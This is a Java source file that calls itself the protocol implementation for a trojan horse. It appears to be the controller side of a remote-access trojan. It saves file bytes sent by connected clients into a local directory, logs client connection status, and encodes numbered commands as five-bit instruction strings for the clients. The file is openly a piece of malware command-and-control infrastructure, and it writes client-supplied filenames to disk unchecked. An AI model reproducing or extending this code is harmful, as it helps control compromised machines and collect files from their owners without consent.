/**
 * Writers: Dror Ventura, Shimrit Hoori
 * 
 */
package protocol;

import utils.FileData;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

/**
 * this is the protocol's implementation for the trojan horse
 */
public class ProtocolImpl implements Protocol {

    /**
     * @param fileData - the file object with all content data bytes
     * @return - always false
     */
    @Override
    public boolean processMessage(FileData fileData) {
        String destinationDirectory = fileData.getDestinationDirectory();
        File file = new File (destinationDirectory);

        if (!file.exists()) 
            new File(destinationDirectory).mkdirs();

        String outputPath = destinationDirectory + fileData.getFilename();
        File outputFile = new File(outputPath);

        try {
            FileOutputStream fileOutputStream = new FileOutputStream(outputFile);
            fileOutputStream.write(fileData.getFileData());
            fileOutputStream.flush();
            fileOutputStream.close();
        }
        catch (IOException e) {
            e.printStackTrace();
        }

        System.out.println("Output file : " + outputFile + " is successfully saved ");
        return false;
    }

    /**
     * upon receiving a response from client
     * it echos the status of the client or the message content to System.out
     * @param string - string message as a response,
     *                 if 0 it echos: "[clientId] is closing connection"
     *                 if 1 it echos: "[clientId] connected successfully"
     * @return - true if message is "done",
     *           false otherwise.
     */
    @Override
    public boolean processMessage(String string) {
        String[] parsedMessage = string.split(";");
        String clientId = parsedMessage[0];
        String messageContent = parsedMessage[1];
        switch (messageContent) {
            case "0":
                System.out.println(clientId + " is closing connection");
                break;
            case "1":
                System.out.println(clientId + " connected successfully");
                break;
            case "done":
                return true;
            default:
                System.out.println(clientId + ": " + messageContent);
                break;
        }
        return false;
    }

    /**
     * @param string an instruction coded as numbers separated by semi-colon in example 1;2;3
     * @return - a string of numbers coded as a binary instruction i.e the instruction above will resolve the message "01110"
     */
    @Override
    public String prepareMessage(String string) {
        String[] commands = string.split(";");
        StringBuilder message = new StringBuilder("00000");

        for (String command : commands) {
            try {
                switch (Integer.parseInt(command)) {
                    case 0:
                        message.setCharAt(0,'1');
                        break;
                    case 1:
                        message.setCharAt(1,'1');
                        break;
                    case 2:
                        message.setCharAt(2, '1');
                        break;
                    case 3:
                        message.setCharAt(3, '1');
                        break;
                    case 4:
                        message.setCharAt(4, '1');
                        break;
                    default:
                        break;
                }
            }
            catch (NumberFormatException e) {
                return message.toString();
            }
        }
        return message.toString();
    }
}
